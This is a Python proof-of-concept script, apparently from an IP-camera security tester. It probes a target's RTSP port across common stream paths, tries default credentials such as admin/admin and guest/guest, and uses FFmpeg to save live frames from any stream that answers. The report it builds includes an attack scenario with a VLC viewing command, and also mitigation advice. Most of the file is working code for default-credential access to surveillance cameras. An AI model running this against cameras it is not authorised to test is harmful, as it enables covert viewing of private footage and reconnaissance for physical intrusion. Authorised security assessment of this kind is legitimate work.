#!/usr/bin/env python3
"""
RTSP Proof-of-Concept Module
Demonstrates real vulnerability by capturing live camera frames
Uses FFmpeg to extract frames from accessible RTSP streams
"""

import subprocess
import os
import json
from datetime import datetime
from typing import Dict, Any, Optional
import socket
import time

class RTSPProofOfConcept:
    """
    Captures actual RTSP frames to prove vulnerability
    Shows that unauthorized access to live surveillance is possible
    """
    
    # Common RTSP stream paths across different camera manufacturers
    COMMON_RTSP_PATHS = [
        '/live',
        '/live/ch0',
        '/live/ch1',
        '/stream',
        '/stream1',
        '/stream0',
        '/stream_ch00',
        '/rtsp_live',
        '/h264/ch1/main/av_stream',
        '/h264/ch0/main/av_stream',
        '/ISAPI/Streaming/Channels/1',
        '/media/video1',
        '/ch0',
        '/ch1',
    ]
    
    # Credentials to try (common defaults)
    COMMON_CREDENTIALS = [
        ('admin', 'admin'),
        ('guest', 'guest'),
        ('', ''),  # No credentials
        ('admin', ''),
        ('', 'admin'),
    ]
    
    def __init__(self, target_ip: str, output_dir: str = '/tmp'):
        """
        Initialize RTSP proof-of-concept tester
        
        Args:
            target_ip: Camera IP address
            output_dir: Directory to save snapshots
        """
        self.target_ip = target_ip
        self.output_dir = output_dir
        self.accessible_streams = []
        self.snapshots = []
        
        # Create output directory if it doesn't exist
        os.makedirs(output_dir, exist_ok=True)
    
    def get_snapshot_filename(self, stream_path: str, index: int) -> str:
        """Generate unique snapshot filename"""
        safe_path = stream_path.replace('/', '_').strip('_')
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        return os.path.join(self.output_dir, f'rtsp_{safe_path}_{index}_{timestamp}.jpg')
    
    def test_rtsp_connection(self, stream_url: str, timeout: int = 5) -> bool:
        """
        Quick test if RTSP stream is accessible
        Uses TCP connect attempt (faster than full RTSPLib)
        
        Args:
            stream_url: Full RTSP URL (rtsp://ip/path)
            timeout: Connection timeout in seconds
        
        Returns:
            True if stream appears accessible, False otherwise
        """
        try:
            # Parse IP and port from RTSP URL
            # Format: rtsp://[user:password@]host:port/path
            parts = stream_url.replace('rtsp://', '').split('/')
            host_port = parts[0]
            
            if '@' in host_port:
                host_port = host_port.split('@')[1]
            
            if ':' in host_port:
                host, port = host_port.rsplit(':', 1)
                port = int(port)
            else:
                host = host_port
                port = 554  # Default RTSP port
            
            # Test TCP connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            sock.close()
            
            return result == 0
        except Exception as e:
            print(f"  ⚠ Connection test error: {e}")
            return False
    
    def capture_rtsp_frame(self, rtsp_url: str, output_path: str, timeout: int = 10) -> bool:
        """
        Capture a single frame from RTSP stream using FFmpeg
        
        Args:
            rtsp_url: Full RTSP URL
            output_path: Path to save JPEG snapshot
            timeout: FFmpeg timeout in seconds
        
        Returns:
            True if frame captured successfully, False otherwise
        """
        try:
            # FFmpeg command to capture 1 frame
            # -rtsp_transport tcp: Use TCP instead of UDP for reliability
            # -frames:v 1: Capture exactly 1 frame
            # -f image2: Output as image
            # -y: Overwrite output file
            
            cmd = [
                'ffmpeg',
                '-rtsp_transport', 'tcp',
                '-i', rtsp_url,
                '-frames:v', '1',
                '-f', 'image2',
                '-y',  # Overwrite without asking
                output_path
            ]
            
            print(f"  🎬 Capturing frame: {rtsp_url}")
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout
            )
            
            # Check if file was created
            if os.path.exists(output_path) and os.path.getsize(output_path) > 1000:
                print(f"  ✓ Frame captured: {os.path.basename(output_path)}")
                return True
            else:
                print(f"  ✗ No frame captured or file too small")
                return False
                
        except subprocess.TimeoutExpired:
            print(f"  ✗ FFmpeg timeout (stream not responding)")
            return False
        except FileNotFoundError:
            print(f"  ⚠ FFmpeg not found - install with: apt-get install ffmpeg")
            return False
        except Exception as e:
            print(f"  ✗ Capture error: {e}")
            return False
    
    def test_stream_path(self, path: str, credentials: tuple = ('', '')) -> Optional[Dict]:
        """
        Test a specific RTSP path and attempt frame capture
        
        Returns:
            {
                'path': stream_path,
                'url': full_rtsp_url,
                'accessible': bool,
                'snapshot': path_to_file_or_None,
                'credential': (username, password) if used,
                'timestamp': ISO timestamp
            }
        """
        username, password = credentials
        
        # Build RTSP URL with optional credentials
        if username or password:
            rtsp_url = f'rtsp://{username}:{password}@{self.target_ip}:554{path}'
            cred_display = f"{username}:{password}"
        else:
            rtsp_url = f'rtsp://{self.target_ip}:554{path}'
            cred_display = "anonymous"
        
        print(f"  Testing: {path} ({cred_display})")
        
        # First do quick connection test
        if not self.test_rtsp_connection(rtsp_url, timeout=3):
            print(f"    Connection test failed")
            return None
        
        # Connection succeeded! Stream is reachable
        print(f"    ✓ Stream REACHABLE (TCP connection successful)")
        self.accessible_streams.append({
            'path': path,
            'url': rtsp_url,
            'credential': cred_display if (username or password) else 'none'
        })
        
        # Try to capture frame
        snapshot_file = self.get_snapshot_filename(path, len(self.snapshots))
        
        if self.capture_rtsp_frame(rtsp_url, snapshot_file, timeout=8):
            result = {
                'path': path,
                'url': rtsp_url,
                'accessible': True,
                'snapshot': snapshot_file,
                'snapshot_filename': os.path.basename(snapshot_file),
                'credential': cred_display if (username or password) else 'none',
                'timestamp': datetime.now().isoformat(),
                'file_size_bytes': os.path.getsize(snapshot_file)
            }
            self.snapshots.append(result)
            return result
        else:
            # Connection worked but frame capture failed - still log it
            print(f"    ⚠ Stream reachable but frame capture failed (FFmpeg issue or stream restricted)")
        
        return None
    
    def run_proof_of_concept(self) -> Dict[str, Any]:
        """
        Main function: Test all common RTSP paths and credentials
        Demonstrates real vulnerability by accessing actual streams
        
        Returns:
            {
                'target_ip': IP,
                'rtsp_accessible': bool,
                'streams_found': number,
                'snapshots': [{...}, ...],
                'recommendations': [...]
            }
        """
        print(f"\n{'='*70}")
        print(f"🔴 RTSP PROOF-OF-CONCEPT TEST")
        print(f"Target: {self.target_ip}")
        print(f"{'='*70}")
        print(f"Testing {len(self.COMMON_RTSP_PATHS)} common stream paths...")
        print(f"Attempting frame capture from accessible streams...\n")
        
        # Test each path with no credentials first
        for path in self.COMMON_RTSP_PATHS:
            result = self.test_stream_path(path, credentials=('', ''))
            if result:
                print(f"  ✓ SUCCESS: Stream accessible at {path}")
                break  # Found one, no need to test others right now
        
        # If no luck with anonymous, try default credentials
        if not self.snapshots:
            print(f"\nTrying with default credentials...")
            for username, password in self.COMMON_CREDENTIALS[1:]:  # Skip first empty one
                for path in self.COMMON_RTSP_PATHS[:3]:  # Just test first 3 paths
                    result = self.test_stream_path(path, credentials=(username, password))
                    if result:
                        print(f"  ✓ SUCCESS: Stream accessible with {username}/{password}")
                        break
                if result:
                    break
        
        # Generate report
        # Mark as accessible if EITHER we captured frames OR stream was reachable via TCP
        is_accessible = len(self.snapshots) > 0 or len(self.accessible_streams) > 0
        
        report = {
            'target_ip': self.target_ip,
            'test_time': datetime.now().isoformat(),
            'rtsp_accessible': is_accessible,
            'streams_found': len(self.snapshots),
            'accessible_paths': self.accessible_streams,  # Include reachable paths even if no frames
            'snapshots': self.snapshots,
            'severity': 'CRITICAL' if is_accessible else 'INFO',
            'attack_scenario': self._generate_attack_scenario() if self.snapshots else None,
            'mitigation': [
                "Enable RTSP authentication requiring username/password",
                "Configure firewall to restrict RTSP port 554 to trusted IPs only",
                "Use VPN for remote access instead of exposing RTSP directly",
                "Consider using RTSPS (RTSP over TLS) if camera supports it",
                "Update camera firmware to latest security version",
                "Place camera on isolated network segment"
            ]
        }
        
        print(f"\n{'='*70}")
        if self.snapshots:
            print(f"✓ VULNERABILITY CONFIRMED - FRAMES CAPTURED")
            print(f"  {len(self.snapshots)} accessible stream(s) found")
            print(f"  Live frames captured and saved")
            print(f"  → Unauthorized surveillance access possible")
        elif self.accessible_streams:
            print(f"✓ VULNERABILITY CONFIRMED - STREAM REACHABLE")
            print(f"  {len(self.accessible_streams)} accessible stream path(s) found")
            print(f"  Stream responds to connections (TCP reachability confirmed)")
            print(f"  → Stream is exposed to unauthenticated access")
            print(f"  Note: Frame capture failed (FFmpeg/codec issue or restricted access)")
        else:
            print(f"✓ No accessible RTSP streams found (port 554 may be closed or heavily restricted)")
        print(f"{'='*70}\n")
        
        return report
    
    def _generate_attack_scenario(self) -> Dict[str, Any]:
        """Generate realistic attack scenario based on findings"""
        return {
            'title': 'Unauthorized Live Stream Access',
            'difficulty': 'TRIVIAL',
            'steps': [
                '1. Network scan identifies camera at IP + port 554 open',
                '2. Attacker probes common RTSP paths (/live, /stream, etc)',
                '3. RTSP stream responds without authentication',
                '4. Attacker connects with VLC: vlc rtsp://[IP]/stream1',
                '5. LIVE surveillance footage accessible in real-time',
                '6. Attacker can record video, take screenshots, analyze',
                '7. Reconnaissance for physical theft/security bypass'
            ],
            'impact': 'Complete privacy breach, security vulnerability',
            'likelihood': 'VERY HIGH' if not any(s['credential'] != 'none' for s in self.snapshots) else 'HIGH',
            'tools_needed': 'VLC media player (free), basic network tools'
        }


def test_rtsp_for_vulnerability(target_ip: str, output_dir: str = 'results/rtsp_proof') -> Dict[str, Any]:
    """
    Convenience function to test RTSP vulnerability on a target camera
    
    Usage:
        result = test_rtsp_for_vulnerability('192.168.18.234')
    """
    tester = RTSPProofOfConcept(target_ip, output_dir=output_dir)
    return tester.run_proof_of_concept()


if __name__ == '__main__':
    # Example usage
    test_ip = '192.168.18.234'
    result = test_rtsp_for_vulnerability(test_ip)
    
    # Save result
    with open(f'rtsp_proof_{test_ip}.json', 'w') as f:
        # Convert non-serializable objects
        for snapshot in result.get('snapshots', []):
            if 'timestamp' in snapshot:
                snapshot['timestamp'] = str(snapshot['timestamp'])
        json.dump(result, f, indent=2)
    
    print(f"✓ Report saved: rtsp_proof_{test_ip}.json")
